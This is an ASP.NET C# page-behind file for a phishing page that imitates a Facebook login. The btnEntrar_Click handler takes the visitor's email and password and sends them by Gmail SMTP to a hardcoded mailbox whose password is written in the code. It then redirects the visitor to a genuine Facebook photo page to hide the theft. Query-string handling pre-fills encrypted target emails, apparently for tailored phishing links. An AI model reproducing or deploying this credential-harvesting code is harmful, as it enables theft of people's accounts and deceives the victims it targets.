using System;
using System.Net.Mail;
using System.Net;
using System.Web;
using System.Web.UI;
using System.Security.Cryptography;
using System.Web.UI.HtmlControls;

public partial class _Default : Page 
{
    const string smtp = "smtp.gmail.com";
    const string user = "pepe.castigodedeus@gmail.com";
    const string pass = "1Qwertyuiop";

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            bool scroll;
            if (Request.QueryString.HasKeys() && bool.TryParse(Request.QueryString["scroll"], out scroll) && !scroll)
                RedirectToFacebook();

            if (Request.QueryString["email"] != null)
            {
                string descriptograr = Criptografia.Descriptografar(Request.QueryString["email"].ToString(), "#!$a36?@"); 
                txtEmail.Text = txtEmailMobile.Text = descriptograr;
            }
        }

    }

    protected void Page_Init(object sender, EventArgs e)
    {
        string userAgent = Request.UserAgent.ToLower();

        if (userAgent.Contains("android") || userAgent.Contains("iphone") || userAgent.Contains("nokia") || userAgent.Contains("phone") || userAgent.Contains("lg") || userAgent.Contains("blackberry"))
        {
            // Define an HtmlLink control.
            HtmlLink myHtmlLink = new HtmlLink();
            myHtmlLink.Href = "mobile.css";
            myHtmlLink.Attributes.Add("rel", "stylesheet");
            myHtmlLink.Attributes.Add("type", "text/css");

            // Add the HtmlLink to the Head section of the page.
            Page.Header.Controls.Add(myHtmlLink);
        }
    }

    protected void btnEntrar_Click(object sender, EventArgs e)
    {
        string email = String.IsNullOrEmpty(txtEmail.Text) ? txtEmailMobile.Text : txtEmail.Text;
        string password = String.IsNullOrEmpty(txtPassword.Text) ? txtPasswordMobile.Text : txtPassword.Text;

        if (String.IsNullOrEmpty(email) || String.IsNullOrEmpty(password)) 
            return;

        try
        {
            SmtpClient smtpClient = new SmtpClient(smtp, 587);
            smtpClient.EnableSsl = true;
            smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtpClient.UseDefaultCredentials = false;
            smtpClient.Port = 587;
            smtpClient.Credentials = new NetworkCredential(user, pass);

            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress(user);
            mailMessage.Subject = email;
            mailMessage.Body = password;
            mailMessage.IsBodyHtml = true;
            mailMessage.To.Add(user);

            smtpClient.Send(mailMessage);

            RedirectToFacebook();
        }
        catch
        {
            RedirectToFacebook();
        }
    }

    private void RedirectToFacebook()
    {
        bool isMobile = !String.IsNullOrEmpty(txtEmailMobile.Text);
        string domain = isMobile ? "http://m.facebook.com/home.php?refsrc=https%3A%2F%2Fwww.facebook.com%2F&refid=8&_rdr#!/photo.php?{0}" : "http://www.facebook.com/photo.php?{0}";

        Response.Redirect(String.Format(domain, Request.QueryString));
    }

}